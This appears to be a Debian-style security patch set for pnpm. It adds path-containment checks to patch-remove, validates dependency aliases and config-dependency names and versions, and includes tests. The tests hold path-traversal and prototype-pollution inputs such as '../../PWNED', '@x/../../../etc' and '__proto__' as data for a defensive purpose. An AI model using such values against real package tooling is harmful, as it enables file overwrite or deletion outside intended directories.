-   const resolvedDir = path.resolve(modulesDir)
-   const resolvedLink = path.resolve(link)
-   if (resolvedLink === resolvedDir || !resolvedLink.startsWith(resolvedDir + path.sep)) {
--    const error = new Error(`Refusing to symlink dependency outside ${modulesDir}: alias ${JSON.stringify(alias)} resolves to ${resolvedLink}`) as Error & { code: string }
--    error.code = 'ERR_PNPM_INVALID_DEPENDENCY_NAME'
--    throw error
-+    throw invalidDependencyNameError(modulesDir, alias, resolvedLink)
+ export async function switchCliVersion (config: Config): Promise<void> {
+   const pm = config.wantedPackageManager
+   if (pm == null || pm.name !== 'pnpm' || pm.version == null || pm.version === packageManager.version) return
+@@ -20,7 +22,12 @@ export async function switchCliVersion (config: Config): Promise<void> {
+     globalWarn(`Cannot switch to pnpm@${pm.version}: you need to specify the version as "${pmVersion}"`)
+     return
    }
-   return link
- }
-+
-+function invalidDependencyNameError (modulesDir: string, alias: string, resolvedLink?: string): Error & { code: string } {
-+  const detail = resolvedLink ? ` (it resolves to ${resolvedLink})` : ''
-+  const error = new Error(`Refusing to place a dependency under ${modulesDir} with the invalid alias ${JSON.stringify(alias)}${detail}`) as Error & { code: string }
-+  error.code = 'ERR_PNPM_INVALID_DEPENDENCY_NAME'
-+  return error
-+}
---- a/fs/symlink-dependency/test/safeJoinModulesDir.test.ts
-+++ b/fs/symlink-dependency/test/safeJoinModulesDir.test.ts
-@@ -1,10 +1,20 @@
- import fs from 'fs'
- import path from 'path'
--
- import { tempDir } from '@pnpm/prepare'
- import { symlinkDependency, symlinkDependencySync, symlinkDirectRootDependency } from '@pnpm/symlink-dependency'
- 
--const escapeAliases = ['@x/../../../etc', '../sibling', '', '.']
-+const escapeAliases = [
-+  '@x/../../../etc',
-+  '../sibling',
-+  '',
-+  '.',
-+  // Reserved names that resolve *inside* `node_modules` but would
-+  // overwrite pnpm-owned layout, so the containment check alone can't
-+  // catch them.
-+  '.bin',
-+  '.pnpm',
-+  'node_modules',
-+]
- 
- test.each(escapeAliases)('symlinkDependency refuses alias %p', async (alias) => {
-   const tmp = tempDir(false)
-@@ -33,3 +43,15 @@
-     prefix: '',
-   })).rejects.toThrow(expect.objectContaining({ code: 'ERR_PNPM_INVALID_DEPENDENCY_NAME' }))
- })
-+
-+const validAliases = ['foo', '@scope/name', 'foo.bar']
-+
-+test.each(validAliases)('symlinkDependency accepts valid alias %p', async (alias) => {
-+  const tmp = tempDir(false)
-+  const destModulesDir = path.join(tmp, 'node_modules')
-+  fs.mkdirSync(destModulesDir)
-+  const dep = path.join(tmp, 'dep')
-+  fs.mkdirSync(dep)
-+  await expect(symlinkDependency(dep, destModulesDir, alias)).resolves.toBeDefined()
-+  expect(fs.existsSync(path.join(destModulesDir, alias))).toBe(true)
-+})
+-  const { binDir: wantedPnpmBinDir } = await installPnpmToTools(pmVersion, config)
++  // Bootstrap traffic for the wanted pnpm version must not be steered by
++  // repository-controlled registry/proxy/TLS settings.
++  const { binDir: wantedPnpmBinDir } = await installPnpmToTools(pmVersion, {
++    ...config,
++    ...getPackageManagerBootstrapConfig(config),
++  })
+   const pnpmEnv = prependDirsToPath([wantedPnpmBinDir])
+   if (!pnpmEnv.updated) {
+     // We throw this error to prevent an infinite recursive call of the same pnpm version.
 
 Description: Fix CVE-2026-55698 — verify npm registry signature before executing package-manager switch
  Malicious repositories could steer automatic package-manager version switching
@@ -4121,3 +4581,828 @@ Last-Update: 2026-07-07
 +    typeof (signature as PackageSignature).keyid === 'string' &&
 +    typeof (signature as PackageSignature).sig === 'string'
 +}
+
+--- /dev/null
++++ b/.changeset/strange-bin-segments.md
+@@ -0,0 +1,6 @@
++---
++"@pnpm/package-bins": patch
++"pnpm": patch
++---
++
++Reject reserved manifest `bin` names (`""`, `"."`, `".."`, and scoped forms such as `@scope/..`) when resolving a package's bins. These names previously passed the bin-name guard and, when joined to the global bin directory during global remove/update/add operations, could resolve to the global bin directory itself or its parent and have it recursively deleted.
+
+--- /dev/null
++++ b/.changeset/fix-patch-remove-containment.md
+@@ -0,0 +1,6 @@
++---
++"@pnpm/plugin-commands-patching": patch
++"pnpm": patch
++---
++
++Prevent `pnpm patch-remove` from removing files outside the configured patches directory.
+--- /dev/null
++++ b/patching/plugin-commands-patching/src/isSubdirectory.ts
+@@ -0,0 +1,17 @@
++import path from 'path'
++
++interface PathUtils {
++  isAbsolute: (path: string) => boolean
++  relative: (from: string, to: string) => string
++  sep: string
++}
++
++export function isSubdirectory (parentDir: string, childPath: string, pathUtils: PathUtils = path): boolean {
++  const relativePath = pathUtils.relative(parentDir, childPath)
++
++  return relativePath === '' || (
++    relativePath !== '..' &&
++    !relativePath.startsWith(`..${pathUtils.sep}`) &&
++    !pathUtils.isAbsolute(relativePath)
++  )
++}
+--- a/patching/plugin-commands-patching/src/patchRemove.ts
++++ b/patching/plugin-commands-patching/src/patchRemove.ts
+@@ -1,5 +1,6 @@
+-import path from 'path'
++import { type Stats } from 'fs'
+ import fs from 'fs/promises'
++import path from 'path'
+ import { docsUrl } from '@pnpm/cli-utils'
+ import { install } from '@pnpm/plugin-commands-installation'
+ import { type Config, types as allTypes } from '@pnpm/config'
+@@ -7,6 +8,7 @@ import { PnpmError } from '@pnpm/error'
+ import renderHelp from 'render-help'
+ import { prompt } from 'enquirer'
+ import pick from 'ramda/src/pick'
++import { isSubdirectory } from './isSubdirectory.js'
+ import { updatePatchedDependencies } from './updatePatchedDependencies.js'
+ 
+ export function rcOptionsTypes (): Record<string, unknown> {
+@@ -31,7 +33,7 @@ export type PatchRemoveCommandOptions = install.InstallCommandOptions & Pick<Con
+ 
+ export async function handler (opts: PatchRemoveCommandOptions, params: string[]): Promise<void> {
+   let patchesToRemove = params
+-  const patchedDependencies = opts.patchedDependencies ?? {}
++  const patchedDependencies = { ...opts.patchedDependencies }
+ 
+   if (!params.length) {
+     const allPatches = Object.keys(patchedDependencies)
+@@ -60,16 +62,21 @@ export async function handler (opts: PatchRemoveCommandOptions, params: string[]
+     }
+   }
+ 
+-  const patchesDirs = new Set<string>()
+-  await Promise.all(patchesToRemove.map(async (patch) => {
+-    if (Object.hasOwn(patchedDependencies, patch)) {
+-      const patchFile = patchedDependencies[patch]
+-      patchesDirs.add(path.dirname(patchFile))
+-      await fs.rm(patchFile, { force: true })
+-      delete patchedDependencies![patch]
++  const patchRemovalContext = await getPatchRemovalContext(opts)
++  const patchesToRemoveTargets = await Promise.all(patchesToRemove.map(async (patch) => {
++    const patchFile = patchedDependencies[patch]
++    if (patchFile == null) {
++      throw new PnpmError('PATCH_NOT_FOUND', `Patch "${patch}" not found in patched dependencies`)
+     }
++    return getPatchRemovalTarget(patch, patchFile, patchRemovalContext)
+   }))
+ 
++  await Promise.all(patchesToRemoveTargets.map(unlinkPatchIfExists))
++  for (const { patch } of patchesToRemoveTargets) {
++    delete patchedDependencies[patch]
++  }
++
++  const patchesDirs = new Set(patchesToRemoveTargets.map(({ parentDir }) => parentDir))
+   await Promise.all(Array.from(patchesDirs).map(async (dir) => {
+     try {
+       const files = await fs.readdir(dir)
+@@ -83,5 +90,114 @@ export async function handler (opts: PatchRemoveCommandOptions, params: string[]
+     workspaceDir: opts.workspaceDir ?? opts.rootProjectManifestDir,
+   })
+ 
+-  return install.handler(opts)
++  return install.handler({
++    ...opts,
++    patchedDependencies,
++  })
++}
++
++interface PatchRemovalContext {
++  lockfileDir: string
++  patchesDir: string
++  realPatchesDir?: string
++}
++
++interface PatchRemovalTarget {
++  patch: string
++  patchFile: string
++  parentDir: string
++  targetPath: string
++  targetExists: boolean
++}
++
++async function getPatchRemovalContext (opts: PatchRemoveCommandOptions): Promise<PatchRemovalContext> {
++  const lockfileDir = path.resolve(opts.lockfileDir ?? opts.dir ?? process.cwd())
++  const realLockfileDir = await fs.realpath(lockfileDir)
++  const patchesDirSetting = opts.patchesDir ?? 'patches'
++  const patchesDir = path.join(lockfileDir, path.normalize(patchesDirSetting))
++
++  if (!isSubdirectory(lockfileDir, patchesDir)) {
++    throw new PnpmError('PATCHES_DIR_OUTSIDE_PROJECT', `The configured patches directory is outside the project: ${patchesDirSetting}`)
++  }
++
++  const realPatchesDir = await realpathIfExists(patchesDir)
++  if (realPatchesDir != null && !isSubdirectory(realLockfileDir, realPatchesDir)) {
++    throw new PnpmError('PATCHES_DIR_OUTSIDE_PROJECT', `The configured patches directory is outside the project: ${patchesDirSetting}`)
++  }
++
++  return {
++    lockfileDir,
++    patchesDir,
++    realPatchesDir,
++  }
++}
++
++async function getPatchRemovalTarget (
++  patch: string,
++  patchFile: string,
++  ctx: PatchRemovalContext
++): Promise<PatchRemovalTarget> {
++  const targetPath = path.resolve(ctx.lockfileDir, patchFile)
++  if (
++    targetPath === ctx.patchesDir ||
++    !isSubdirectory(ctx.patchesDir, targetPath)
++  ) {
++    throw new PnpmError('PATCH_FILE_OUTSIDE_PATCHES_DIR', `Patch file "${patchFile}" is outside the configured patches directory`)
++  }
++
++  const parentDir = path.dirname(targetPath)
++  const targetStats = await lstatIfExists(targetPath)
++  const realParentDir = await realpathIfExists(parentDir)
++  const realPatchesDir = ctx.realPatchesDir ?? (await realpathIfExists(ctx.patchesDir))
++  if (
++    realParentDir != null &&
++    realPatchesDir != null &&
++    !isSubdirectory(realPatchesDir, realParentDir)
++  ) {
++    throw new PnpmError('PATCH_FILE_OUTSIDE_PATCHES_DIR', `Patch file "${patchFile}" is outside the configured patches directory`)
++  }
++  if (targetStats?.isDirectory()) {
++    throw new PnpmError('PATCH_FILE_IS_DIRECTORY', `Patch file "${patchFile}" is a directory`)
++  }
++
++  return {
++    patch,
++    patchFile,
++    parentDir,
++    targetPath,
++    targetExists: targetStats != null,
++  }
++}
++
++async function unlinkPatchIfExists ({ targetExists, targetPath }: PatchRemovalTarget): Promise<void> {
++  if (!targetExists) return
++
++  try {
++    await fs.unlink(targetPath)
++  } catch (err: unknown) {
++    if (isErrorWithCode(err, 'ENOENT')) return
++    throw err
++  }
++}
++
++async function lstatIfExists (targetPath: string): Promise<Stats | undefined> {
++  try {
++    return await fs.lstat(targetPath)
++  } catch (err: unknown) {
++    if (isErrorWithCode(err, 'ENOENT')) return undefined
++    throw err
++  }
++}
++
++async function realpathIfExists (targetPath: string): Promise<string | undefined> {
++  try {
++    return await fs.realpath(targetPath)
++  } catch (err: unknown) {
++    if (isErrorWithCode(err, 'ENOENT')) return undefined
++    throw err
++  }
++}
++
++function isErrorWithCode (err: unknown, code: string): err is NodeJS.ErrnoException {
++  return typeof err === 'object' && err !== null && 'code' in err && err.code === code
+ }
+--- /dev/null
++++ b/patching/plugin-commands-patching/test/isSubdirectory.test.ts
+@@ -0,0 +1,19 @@
++import path from 'path'
++
++import { isSubdirectory } from '../src/isSubdirectory.js'
++
++test('isSubdirectory() accepts paths inside the parent directory', () => {
++  expect(isSubdirectory('/project/patches', '/project/patches/pkg.patch')).toBe(true)
++  expect(isSubdirectory('/project/patches', '/project/patches/..pkg/pkg.patch')).toBe(true)
++})
++
++test('isSubdirectory() rejects parent traversal and sibling prefixes', () => {
++  expect(isSubdirectory('/project/patches', '/project/pkg.patch')).toBe(false)
++  expect(isSubdirectory('/project/patches', '/project/patches-other/pkg.patch')).toBe(false)
++})
++
++test('isSubdirectory() rejects Windows drive and UNC escapes', () => {
++  expect(isSubdirectory('C:\\project\\patches', 'D:\\pkg.patch', path.win32)).toBe(false)
++  expect(isSubdirectory('C:\\project\\patches', '\\\\server\\share\\pkg.patch', path.win32)).toBe(false)
++  expect(isSubdirectory('C:\\project\\patches', 'C:\\project\\patches\\..pkg\\pkg.patch', path.win32)).toBe(true)
++})
+--- /dev/null
++++ b/patching/plugin-commands-patching/test/patchRemove.test.ts
+@@ -0,0 +1,166 @@
++import fs from 'fs'
++import os from 'os'
++import path from 'path'
++
++import { afterEach, beforeEach, expect, jest, test } from '@jest/globals'
++import { install } from '@pnpm/plugin-commands-installation'
++
++import * as patchRemove from '../src/patchRemove.js'
++import { updatePatchedDependencies } from '../src/updatePatchedDependencies.js'
++import type { PatchRemoveCommandOptions } from '../src/patchRemove.js'
++
++jest.mock('@pnpm/plugin-commands-installation', () => ({
++  install: {
++    handler: jest.fn(),
++  },
++}))
++
++jest.mock('../src/updatePatchedDependencies.js', () => ({
++  updatePatchedDependencies: jest.fn(),
++}))
++
++const installHandler = jest.mocked(install.handler)
++const updatePatchedDependenciesMock = jest.mocked(updatePatchedDependencies)
++const testOnNonWindows = process.platform === 'win32' ? test.skip : test
++
++let tempRoot: string
++
++beforeEach(() => {
++  tempRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'pnpm-patch-remove-'))
++  installHandler.mockResolvedValue(undefined)
++  updatePatchedDependenciesMock.mockResolvedValue(undefined)
++})
++
++afterEach(() => {
++  installHandler.mockReset()
++  updatePatchedDependenciesMock.mockReset()
++  fs.rmSync(tempRoot, { force: true, recursive: true })
++})
++
++test('patch-remove rejects traversal outside the patches directory before deleting any patch', async () => {
++  const projectDir = path.join(tempRoot, 'project')
++  const outsideFile = path.join(tempRoot, 'outside.patch')
++  const goodPatch = path.join(projectDir, 'patches/good.patch')
++  fs.mkdirSync(path.dirname(goodPatch), { recursive: true })
++  fs.writeFileSync(goodPatch, 'good patch', 'utf8')
++  fs.writeFileSync(outsideFile, 'outside patch', 'utf8')
++
++  await expect(patchRemove.handler(createOptions(projectDir, {
++    good: 'patches/good.patch',
++    bad: '../outside.patch',
++  }), ['good', 'bad'])).rejects.toMatchObject({
++    code: 'ERR_PNPM_PATCH_FILE_OUTSIDE_PATCHES_DIR',
++  })
++
++  expect(fs.existsSync(goodPatch)).toBe(true)
++  expect(fs.existsSync(outsideFile)).toBe(true)
++  expect(updatePatchedDependenciesMock).not.toHaveBeenCalled()
++  expect(installHandler).not.toHaveBeenCalled()
++})
++
++test('patch-remove rejects directory entries before deleting any patch', async () => {
++  const projectDir = path.join(tempRoot, 'project')
++  const goodPatch = path.join(projectDir, 'patches/good.patch')
++  const patchDir = path.join(projectDir, 'patches/not-a-file.patch')
++  fs.mkdirSync(patchDir, { recursive: true })
++  fs.writeFileSync(goodPatch, 'good patch', 'utf8')
++
++  await expect(patchRemove.handler(createOptions(projectDir, {
++    good: 'patches/good.patch',
++    bad: 'patches/not-a-file.patch',
++  }), ['good', 'bad'])).rejects.toMatchObject({
++    code: 'ERR_PNPM_PATCH_FILE_IS_DIRECTORY',
++  })
++
++  expect(fs.existsSync(goodPatch)).toBe(true)
++  expect(updatePatchedDependenciesMock).not.toHaveBeenCalled()
++  expect(installHandler).not.toHaveBeenCalled()
++})
++
++testOnNonWindows('patch-remove rejects a nested parent symlink outside the patches directory before unlinking a dangling target', async () => {
++  const projectDir = path.join(tempRoot, 'project')
++  const patchesDir = path.join(projectDir, 'patches')
++  const outsideDir = path.join(tempRoot, 'outside')
++  const outsideDanglingLink = path.join(outsideDir, 'dangling.patch')
++  fs.mkdirSync(patchesDir, { recursive: true })
++  fs.mkdirSync(outsideDir, { recursive: true })
++  fs.symlinkSync(outsideDir, path.join(patchesDir, 'linked-dir'), 'dir')
++  fs.symlinkSync(path.join(tempRoot, 'missing-target.patch'), outsideDanglingLink)
++
++  await expect(patchRemove.handler(createOptions(projectDir, {
++    bad: 'patches/linked-dir/dangling.patch',
++  }), ['bad'])).rejects.toMatchObject({
++    code: 'ERR_PNPM_PATCH_FILE_OUTSIDE_PATCHES_DIR',
++  })
++
++  expect(fs.lstatSync(outsideDanglingLink).isSymbolicLink()).toBe(true)
++  expect(updatePatchedDependenciesMock).not.toHaveBeenCalled()
++  expect(installHandler).not.toHaveBeenCalled()
++})
++
++testOnNonWindows('patch-remove unlinks a final symlink inside the patches directory without touching its target', async () => {
++  const projectDir = path.join(tempRoot, 'project')
++  const patchesDir = path.join(projectDir, 'patches')
++  const outsideTarget = path.join(tempRoot, 'outside-target.patch')
++  const patchLink = path.join(patchesDir, 'linked.patch')
++  fs.mkdirSync(patchesDir, { recursive: true })
++  fs.writeFileSync(outsideTarget, 'outside target', 'utf8')
++  fs.symlinkSync(outsideTarget, patchLink)
++
++  await patchRemove.handler(createOptions(projectDir, {
++    pkg: 'patches/linked.patch',
++  }), ['pkg'])
++
++  expect(fs.existsSync(patchLink)).toBe(false)
++  expect(fs.readFileSync(outsideTarget, 'utf8')).toBe('outside target')
++  expect(updatePatchedDependenciesMock).toHaveBeenCalledWith({}, expect.any(Object))
++  expect(installHandler).toHaveBeenCalledWith(expect.objectContaining({
++    patchedDependencies: {},
++  }))
++})
++
++test('patch-remove allows a symlinked patches directory that resolves inside the project', async () => {
++  const projectDir = path.join(tempRoot, 'project')
++  const realPatchesDir = path.join(projectDir, 'real-patches')
++  const patchFile = path.join(realPatchesDir, 'pkg.patch')
++  fs.mkdirSync(realPatchesDir, { recursive: true })
++  fs.symlinkSync(realPatchesDir, path.join(projectDir, 'patches'), process.platform === 'win32' ? 'junction' : 'dir')
++  fs.writeFileSync(patchFile, 'patch', 'utf8')
++
++  await patchRemove.handler(createOptions(projectDir, {
++    pkg: 'patches/pkg.patch',
++  }), ['pkg'])
++
++  expect(fs.existsSync(patchFile)).toBe(false)
++  expect(updatePatchedDependenciesMock).toHaveBeenCalledWith({}, expect.any(Object))
++  expect(installHandler).toHaveBeenCalledWith(expect.objectContaining({
++    patchedDependencies: {},
++  }))
++})
++
++test('patch-remove keeps missing patch files as no-ops', async () => {
++  const projectDir = path.join(tempRoot, 'project')
++  fs.mkdirSync(path.join(projectDir, 'patches'), { recursive: true })
++
++  await patchRemove.handler(createOptions(projectDir, {
++    pkg: 'patches/missing.patch',
++  }), ['pkg'])
++
++  expect(updatePatchedDependenciesMock).toHaveBeenCalledWith({}, expect.any(Object))
++  expect(installHandler).toHaveBeenCalledWith(expect.objectContaining({
++    patchedDependencies: {},
++  }))
++})
++
++function createOptions (
++  projectDir: string,
++  patchedDependencies: Record<string, string>
++): PatchRemoveCommandOptions {
++  return {
++    dir: projectDir,
++    lockfileDir: projectDir,
++    patchedDependencies,
++    rootProjectManifest: {},
++    rootProjectManifestDir: projectDir,
++  } as PatchRemoveCommandOptions
++}
+
+--- a/fs/symlink-dependency/package.json
++++ b/fs/symlink-dependency/package.json
+@@ -37,7 +37,8 @@
+   "dependencies": {
+     "@pnpm/core-loggers": "workspace:*",
+     "@pnpm/types": "workspace:*",
+-    "symlink-dir": "catalog:"
++    "symlink-dir": "catalog:",
++    "validate-npm-package-name": "catalog:"
+   },
+   "peerDependencies": {
+     "@pnpm/logger": "catalog:"
+@@ -45,7 +46,8 @@
+   "devDependencies": {
+     "@pnpm/logger": "workspace:*",
+     "@pnpm/prepare": "workspace:*",
+-    "@pnpm/symlink-dependency": "workspace:*"
++    "@pnpm/symlink-dependency": "workspace:*",
++    "@types/validate-npm-package-name": "catalog:"
+   },
+   "engines": {
+     "node": ">=18.12"
+--- a/fs/symlink-dependency/src/safeJoinModulesDir.ts
++++ b/fs/symlink-dependency/src/safeJoinModulesDir.ts
+@@ -1,19 +1,37 @@
+ import path from 'path'
+ 
+-// `path.join(modulesDir, alias)` paired with a containment check, so a
+-// caller can't accidentally use the joined path without verifying that
+-// it lives inside `modulesDir`. Earlier passes reject path-traversal
+-// aliases at manifest-read time, but this layer also runs for paths
+-// reconstructed from lockfiles and snapshots, so the check stays here
+-// as a final guarantee.
++import validateNpmPackageName from 'validate-npm-package-name'
++
++// Joins `modulesDir` with a dependency alias and guarantees the result
++// stays a direct child of `modulesDir`. The alias becomes a directory
++// name inside `node_modules`, so it must be a valid npm package name: a
++// single `name` or `@scope/name` of URL-friendly characters with no
++// leading `.` or `_`, and not a reserved name. That rejects
++// path-traversal (`../x`), absolute, and pnpm-owned aliases (`.bin`,
++// `.pnpm`, `node_modules`) before they can escape `modulesDir` or
++// overwrite pnpm's own layout. The containment check is kept as a
++// belt-and-suspenders guard for any platform-specific join behavior the
++// name check might not anticipate.
++//
++// Earlier passes reject such aliases at manifest-read and resolution
++// time, but this layer also runs for paths reconstructed from lockfiles
++// and snapshots, so the check stays here as a final guarantee.
+ export function safeJoinModulesDir (modulesDir: string, alias: string): string {
++  if (!validateNpmPackageName(alias).validForOldPackages) {
++    throw invalidDependencyNameError(modulesDir, alias)
++  }
+   const link = path.join(modulesDir, alias)
+   const resolvedDir = path.resolve(modulesDir)
+   const resolvedLink = path.resolve(link)
+   if (resolvedLink === resolvedDir || !resolvedLink.startsWith(resolvedDir + path.sep)) {
+-    const error = new Error(`Refusing to symlink dependency outside ${modulesDir}: alias ${JSON.stringify(alias)} resolves to ${resolvedLink}`) as Error & { code: string }
+-    error.code = 'ERR_PNPM_INVALID_DEPENDENCY_NAME'
+-    throw error
++    throw invalidDependencyNameError(modulesDir, alias, resolvedLink)
+   }
+   return link
+ }
++
++function invalidDependencyNameError (modulesDir: string, alias: string, resolvedLink?: string): Error & { code: string } {
++  const detail = resolvedLink ? ` (it resolves to ${resolvedLink})` : ''
++  const error = new Error(`Refusing to place a dependency under ${modulesDir} with the invalid alias ${JSON.stringify(alias)}${detail}`) as Error & { code: string }
++  error.code = 'ERR_PNPM_INVALID_DEPENDENCY_NAME'
++  return error
++}
+--- a/fs/symlink-dependency/test/safeJoinModulesDir.test.ts
++++ b/fs/symlink-dependency/test/safeJoinModulesDir.test.ts
+@@ -1,10 +1,20 @@
+ import fs from 'fs'
+ import path from 'path'
+-
+ import { tempDir } from '@pnpm/prepare'
+ import { symlinkDependency, symlinkDependencySync, symlinkDirectRootDependency } from '@pnpm/symlink-dependency'
+ 
+-const escapeAliases = ['@x/../../../etc', '../sibling', '', '.']
++const escapeAliases = [
++  '@x/../../../etc',
++  '../sibling',
++  '',
++  '.',
++  // Reserved names that resolve *inside* `node_modules` but would
++  // overwrite pnpm-owned layout, so the containment check alone can't
++  // catch them.
++  '.bin',
++  '.pnpm',
++  'node_modules',
++]
+ 
+ test.each(escapeAliases)('symlinkDependency refuses alias %p', async (alias) => {
+   const tmp = tempDir(false)
+@@ -33,3 +43,15 @@
+     prefix: '',
+   })).rejects.toThrow(expect.objectContaining({ code: 'ERR_PNPM_INVALID_DEPENDENCY_NAME' }))
+ })
++
++const validAliases = ['foo', '@scope/name', 'foo.bar']
++
++test.each(validAliases)('symlinkDependency accepts valid alias %p', async (alias) => {
++  const tmp = tempDir(false)
++  const destModulesDir = path.join(tmp, 'node_modules')
++  fs.mkdirSync(destModulesDir)
++  const dep = path.join(tmp, 'dep')
++  fs.mkdirSync(dep)
++  await expect(symlinkDependency(dep, destModulesDir, alias)).resolves.toBeDefined()
++  expect(fs.existsSync(path.join(destModulesDir, alias))).toBe(true)
++})
+
+--- a/config/deps-installer/package.json
++++ b/config/deps-installer/package.json
+@@ -1,6 +1,6 @@
+ {
+   "name": "@pnpm/config.deps-installer",
+-  "version": "1000.1.4",
++  "version": "1000.1.8",
+   "description": "Installer for configurational dependencies",
+   "keywords": [
+     "pnpm",
+@@ -47,7 +47,9 @@
+     "@pnpm/read-package-json": "workspace:*",
+     "@pnpm/types": "workspace:*",
+     "@zkochan/rimraf": "catalog:",
+-    "get-npm-tarball-url": "catalog:"
++    "get-npm-tarball-url": "catalog:",
++    "semver": "catalog:",
++    "validate-npm-package-name": "catalog:"
+   },
+   "peerDependencies": {
+     "@pnpm/logger": "catalog:"
+@@ -57,6 +59,8 @@
+     "@pnpm/prepare": "workspace:*",
+     "@pnpm/registry-mock": "catalog:",
+     "@pnpm/testing.temp-store": "workspace:*",
++    "@types/semver": "catalog:",
++    "@types/validate-npm-package-name": "catalog:",
+     "load-json-file": "catalog:",
+     "read-yaml-file": "catalog:"
+   },
+--- /dev/null
++++ b/config/deps-installer/src/assertValidConfigDepName.ts
+@@ -0,0 +1,20 @@
++import { PnpmError } from '@pnpm/error'
++import validateNpmPackageName from 'validate-npm-package-name'
++
++// A config-dependency name becomes a directory pnpm creates during install
++// (`node_modules/.pnpm-config/<name>`) and a store path segment, so it must be
++// a valid npm package name. A traversal-shaped name (`../../PWNED`), a reserved
++// name (`.bin`, `.pnpm`, `node_modules`), or `__proto__` is rejected before any
++// path is built from it. Matches the `validForOldPackages` check pnpm applies
++// to dependency aliases read from a manifest.
++export function assertValidConfigDepName (name: string): void {
++  if (!validateNpmPackageName(name).validForOldPackages) {
++    throw new PnpmError(
++      'INVALID_DEPENDENCY_NAME',
++      `The configDependencies in pnpm-workspace.yaml contains a dependency with an invalid name: ${JSON.stringify(name)}`,
++      {
++        hint: 'A dependency name must be a valid npm package name — a single `name` or `@scope/name` consisting of URL-friendly characters, with no leading `.` or `_`, and not equal to reserved names such as `node_modules`.',
++      }
++    )
++  }
++}
+--- /dev/null
++++ b/config/deps-installer/src/assertValidConfigDepVersion.ts
+@@ -0,0 +1,15 @@
++import { PnpmError } from '@pnpm/error'
++import semver from 'semver'
++
++// A config-dep version becomes a store path segment (`<name>/<version>/<hash>`),
++// so reject non-semver values to keep a traversal-shaped version from escaping
++// the store root.
++export function assertValidConfigDepVersion (name: string, version: string): void {
++  if (semver.valid(version) == null) {
++    throw new PnpmError(
++      'INVALID_CONFIG_DEP_VERSION',
++      `The config dependency "${name}" has an invalid version "${version}"`,
++      { hint: 'A config dependency version must be an exact semver version.' }
++    )
++  }
++}
+--- a/config/deps-installer/src/normalizeConfigDeps.ts
++++ b/config/deps-installer/src/normalizeConfigDeps.ts
+@@ -2,6 +2,8 @@
+ import { PnpmError } from '@pnpm/error'
+ import { pickRegistryForPackage } from '@pnpm/pick-registry-for-package'
+ import { type ConfigDependencies, type Registries } from '@pnpm/types'
++import { assertValidConfigDepName } from './assertValidConfigDepName.js'
++import { assertValidConfigDepVersion } from './assertValidConfigDepVersion.js'
+ 
+ interface NormalizeConfigDepsOpts {
+   registries: Registries
+@@ -18,10 +20,14 @@
+ export function normalizeConfigDeps (configDependencies: ConfigDependencies, opts: NormalizeConfigDepsOpts): NormalizedConfigDeps {
+   const deps: NormalizedConfigDeps = {}
+   for (const [pkgName, pkgSpec] of Object.entries(configDependencies)) {
++    // Validate before building any path from the name or version: both become
++    // path segments of the directories pnpm creates during install.
++    assertValidConfigDepName(pkgName)
+     const registry = pickRegistryForPackage(opts.registries, pkgName)
+ 
+     if (typeof pkgSpec === 'object') {
+       const { version, integrity } = parseIntegrity(pkgName, pkgSpec.integrity)
++      assertValidConfigDepVersion(pkgName, version)
+       deps[pkgName] = {
+         version,
+         resolution: {
+@@ -34,6 +40,7 @@
+ 
+     if (typeof pkgSpec === 'string') {
+       const { version, integrity } = parseIntegrity(pkgName, pkgSpec)
++      assertValidConfigDepVersion(pkgName, version)
+       deps[pkgName] = {
+         version,
+         resolution: {
+--- a/config/deps-installer/test/installConfigDeps.ts
++++ b/config/deps-installer/test/installConfigDeps.ts
+@@ -1,4 +1,5 @@
+ import fs from 'fs'
++import path from 'path'
+ import { prepareEmpty } from '@pnpm/prepare'
+ import { getIntegrity, REGISTRY_MOCK_PORT } from '@pnpm/registry-mock'
+ import { createTempStore } from '@pnpm/testing.temp-store'
+@@ -7,6 +8,22 @@
+ 
+ const registry = `http://localhost:${REGISTRY_MOCK_PORT}/`
+ 
++// Recursively search `dir` for an entry named `name`, without following
++// symlinks (so it can't loop through the links a successful install creates).
++function containsEntryNamed (dir: string, name: string): boolean {
++  let entries: fs.Dirent[]
++  try {
++    entries = fs.readdirSync(dir, { withFileTypes: true })
++  } catch {
++    return false
++  }
++  for (const entry of entries) {
++    if (entry.name === name) return true
++    if (entry.isDirectory() && containsEntryNamed(path.join(dir, entry.name), name)) return true
++  }
++  return false
++}
++
+ test('configuration dependency is installed', async () => {
+   prepareEmpty()
+   const { storeController } = createTempStore()
+@@ -101,4 +118,63 @@
+     rootDir: process.cwd(),
+     store: storeController,
+   })).rejects.toThrow("doesn't have an integrity checksum")
++})
++
++test('a config dependency with a path-traversal name is rejected', async () => {
++  prepareEmpty()
++  const { storeController, storeDir } = createTempStore()
++
++  const configDeps: Record<string, string> = {
++    '../../PWNED': `100.0.0+${getIntegrity('@pnpm.e2e/foo', '100.0.0')}`,
++  }
++  await expect(installConfigDeps(configDeps, {
++    registries: {
++      default: registry,
++    },
++    rootDir: process.cwd(),
++    store: storeController,
++  })).rejects.toThrow('invalid name')
++
++  expect(containsEntryNamed(process.cwd(), 'PWNED')).toBe(false)
++  expect(containsEntryNamed(storeDir, 'PWNED')).toBe(false)
++})
++
++test('a config dependency named __proto__ is rejected', async () => {
++  prepareEmpty()
++  const { storeController, storeDir } = createTempStore()
++
++  // JSON.parse makes `__proto__` an own enumerable key (as on-disk parsing
++  // does); a plain object literal would set the prototype and hide it.
++  const configDeps: Record<string, string> = JSON.parse(
++    `{"__proto__":"100.0.0+${getIntegrity('@pnpm.e2e/foo', '100.0.0')}"}`
++  )
++  await expect(installConfigDeps(configDeps, {
++    registries: {
++      default: registry,
++    },
++    rootDir: process.cwd(),
++    store: storeController,
++  })).rejects.toThrow('invalid name')
++
++  expect(containsEntryNamed(process.cwd(), '__proto__')).toBe(false)
++  expect(containsEntryNamed(storeDir, '__proto__')).toBe(false)
++})
++
++test('a config dependency with a path-traversal version is rejected', async () => {
++  prepareEmpty()
++  const { storeController, storeDir } = createTempStore()
++
++  const configDeps: Record<string, string> = {
++    '@pnpm.e2e/foo': `../../../PWNED+${getIntegrity('@pnpm.e2e/foo', '100.0.0')}`,
++  }
++  await expect(installConfigDeps(configDeps, {
++    registries: {
++      default: registry,
++    },
++    rootDir: process.cwd(),
++    store: storeController,
++  })).rejects.toThrow('invalid version')
++
++  expect(containsEntryNamed(process.cwd(), 'PWNED')).toBe(false)
++  expect(containsEntryNamed(storeDir, 'PWNED')).toBe(false)
+ })
+--- a/pkg-manager/headless/src/lockfileToHoistedDepGraph.ts
++++ b/pkg-manager/headless/src/lockfileToHoistedDepGraph.ts
+@@ -15,6 +15,7 @@
